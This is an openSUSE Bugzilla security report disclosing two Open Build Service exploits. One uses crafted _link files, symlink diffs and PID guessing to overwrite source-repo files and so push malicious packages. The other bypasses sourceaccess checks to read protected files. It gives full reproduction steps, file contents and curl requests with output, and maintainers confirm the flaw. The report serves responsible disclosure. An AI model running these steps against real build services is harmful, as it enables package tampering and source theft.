| [Description](show_bug.cgi?id=941099#c0)  Marcus Meissner   2015-08-10 09:32:01 UTC  ``` reported by Marcus Huewe, cced.  Hi,  I hope this the correct way to report a security issue (I couldn't find an option to file a non-public bug on bugzilla.opensuse.org).  Currently, it is possible to exploit an OBS _link file in order to a) modify arbitrary files in the srcserver's source repo b) get files from a package whose sourceaccess is disabled  For this, two different "strategies" are employed.  a) Assumptions: - the user "mallory" has no write access to the package "foobar/somepkg" - the "foobar/somepkg" package's sourceaccess is enabled (default) - $BSConfig::nosharedtrees == 0 (if it is enabled, some paths in the   following example have to be adjusted) - there exists a "home:mallory/dummy" package that provides a file called   "dummy" (arbitrary content - this package and file just serve as a dummy   link target)  Goal: - modify the "foobar/somepkg/test.spec" file  Since sourceaccess is not disabled, everyone can retrieve the md5 of the "foobar/somepkg/test.spec" file. Let's assume "test.spec" has the md5 "aedf32bfbdcd41616577fe5d907ab285".  Next, perform the following steps: - create and checkout the "home:mallory/link" package - cd into the checked out package - execute "python ~/genpatch.py ../../somepkg/aedf32bfbdcd41616577fe5d907ab285-test.spec 1 32768"   Here, "32768" is a guessed value for the pid_max of the srcserver's host.   Depending on the srcserver's "load", it possible to do better estimations   for the lower and upper pid range (some code paths in "applylink" print out   the name of the $tmpdir (which includes the current process' pid) in case of   an error (so we just have to provoke some error)) - create a "_link" file with the following content:  marcus@linux:~/home:mallory/link> cat _link  <link package="dummy">   <patches>     <apply name="symlinks.diff"/>     <topadd>Hello world Add more content here...     </topadd>   </patches> </link> marcus@linux:~/home:mallory/link>  - execute "touch dummy.spec" - commit the "_link", "symlinks.diff", and "dummy.spec" files  As we can see, the commit modified the "somepkg/aedf32bfbdcd41616577fe5d907ab285-test.spec" file:  marcus@linux:~> curl -u mallory:foobar <http://localhost:3000/source/foobar/somepkg/test.spec> Hello world Add more content here...      marcus@linux:~>  (new md5sum: "cec2e1920513ada2f8bbfa07816d6412")  How it works: - when applying the git-style "symlinks.diff" file, patch creates multiple   symlinks ".topaddspec<NUMBER>" pointing to the   "../../somepkg/aedf32bfbdcd41616577fe5d907ab285-test.spec" file - when the topadd is applied, the "topaddspec" function writes the   "Hello world..." text to the file ".topaddspec<PID>"  Hence, if the process' PID lies in our guessed pid range, the "../../somepkg/aedf32bfbdcd41616577fe5d907ab285-test.spec" is modified.  Implications: Instead of a spec file, one could, e.g, also modify a package's revision metadata (use "../../../projects/home:mallory.pkg/link.rev" as the symlink target). So eventually, it is possible to distribute malicious packages to the users - example: - modify files (including the *.rev and *-MD5SUMS file) using the   approach from above - wait for a scheduler cold start or a change in the prjconf/project meta   (so that the scheduler fetches the "updated" projpack information from the   srcserver) - the scheduler recognizes the source change and starts a build  Note: if the scheduler and srcserver run on the same host, it is also possible to directly trigger a build of the modified package by creating a "package" event (again using the approach from above).  ###  b) Assumptions: - the user "mallory" has no write access to the package "secret/secretpkg" - the "secret/secretpkg" package's sourceaccess is disabled - there exists a "home:mallory/dummy" package that provides a file called   "dummy" (arbitrary content - this package and file just serve as a dummy    link target)  Goal: - get the "secret/secretpkg/foo" file  Since the sourceaccess is disabled, we cannot simply link the "secret/secretpkg" package into our project. However, the following works:  - create and checkout a "home:mallory/access" package - cd into the checked out package - create a "createlink.diff" file with the following content:  marcus@linux:~/home:mallory/access> cat createlink.diff  --- /dev/null   2015-08-08 12:26:36.894109984 +0200 +++ _link   2015-08-08 14:11:54.419202132 +0200 @@ -0,0 +1 @@ +<link project="secret" package="secretpkg"/> marcus@linux:~/home:mallory/access>  - create a "_link" file with the following content:  marcus@linux:~/home:mallory/access> cat _link  <link package="dummy">   <patches>     <apply name="createlink.diff"/>   </patches> </link> marcus@linux:~/home:mallory/access>  - commit the "createlink.diff" and "_link" files  Now, the files can be accessed as follows:  marcus@linux:~> curl -u mallory:foobar [http://localhost:3000/source/home:mallory/access](http://localhost:3000/source/home%3Amallory/access) <directory name="access" rev="1" vrev="1" srcmd5="be20e3ff985780248ff29f3385c95b7f">   <linkinfo project="home:mallory" package="dummy" srcmd5="b2168fcfa0333db735a892518d997b38" xsrcmd5="f354de92458d31d5ce848b25d5cda944" lsrcmd5="be20e3ff985780248ff29f3385c95b7f" />   <entry name="_link" md5="0e867bff456517105f4899c8be0eff1f" size="92" mtime="1439035974" />   <entry name="createlink.diff" md5="e10be85b6b7904572234da5b39af9140" size="156" mtime="1439035974" /> </directory> marcus@linux:~> curl -u mallory:foobar '[http://localhost:3000/source/home:mallory/access?rev=f354de92458d31d5ce848b25d5cda944&expand=1](http://localhost:3000/source/home%3Amallory/access?rev=f354de92458d31d5ce848b25d5cda944&expand=1)' <directory name="access" rev="9f25dfc1371646872e9268df476eaaa7" vrev="1" srcmd5="9f25dfc1371646872e9268df476eaaa7">   <linkinfo project="secret" package="secretpkg" srcmd5="2cf5937efc6957571226958fbb3e0b9c" lsrcmd5="f354de92458d31d5ce848b25d5cda944" />   <entry name="dummy" md5="d41d8cd98f00b204e9800998ecf8427e" size="0" mtime="1438988464" />   <entry name="foo" md5="eb9c2bf0eb63f3a7bc0ea37ef18aeba5" size="13" mtime="1439035735" /> </directory> marcus@linux:~> curl -u mallory:foobar '[http://localhost:3000/source/home:mallory/access/foo?rev=9f25dfc1371646872e9268df476eaaa7](http://localhost:3000/source/home%3Amallory/access/foo?rev=9f25dfc1371646872e9268df476eaaa7)' some content marcus@linux:~>  Thus, we have access to the file "foo".  How it works: - the expanded sources contain a "_link" that points to the package whose   sourceaccess disabled  - if we again expand the "expanded" sources, we can access the "foo" file,   because the backend does no permission/sourceaccess checks  Implications: Files that are contained in a package whose sourceaccess is disabled can be retrieved.  ###  The attached patch should prevent the "attacks" described in a) and b). At least so far I'm not able to perform the "attack" described in a) using a single <apply name="foo.diff"/> element, but maybe I just overlooked something:)   Marcus ``` [Comment 1](show_bug.cgi?id=941099#c1)  Marcus Meissner   2015-08-10 09:32:27 UTC  ``` Created [attachment 643298](attachment.cgi?id=643298 "genpatch.py") [[details]](attachment.cgi?id=643298&action=edit "genpatch.py") genpatch.py  genpatch.py  mentioned in email. ``` [Comment 2](show_bug.cgi?id=941099#c2)  Marcus Meissner   2015-08-10 09:32:56 UTC  ``` Created [attachment 643301](attachment.cgi?id=643301&action=diff "0001-backend-fixed-security-bug-in-applylink.patch") [[details]](attachment.cgi?id=643301&action=edit "0001-backend-fixed-security-bug-in-applylink.patch") 0001-backend-fixed-security-bug-in-applylink.patch  0001-backend-fixed-security-bug-in-applylink.patch  from marcus email. ``` [Comment 3](show_bug.cgi?id=941099#c3)  Adrian Schröter   2015-08-10 11:46:43 UTC  ``` The issue exists, Michael will fix it a little bit different though. ``` [Comment 4](show_bug.cgi?id=941099#c4)  Marcus Hüwe   2015-08-11 23:43:54 UTC  ``` (In reply to Adrian Schröter from [comment #3](show_bug.cgi?id=941099#c3)) > The issue exists, Michael will fix it a little bit different though.
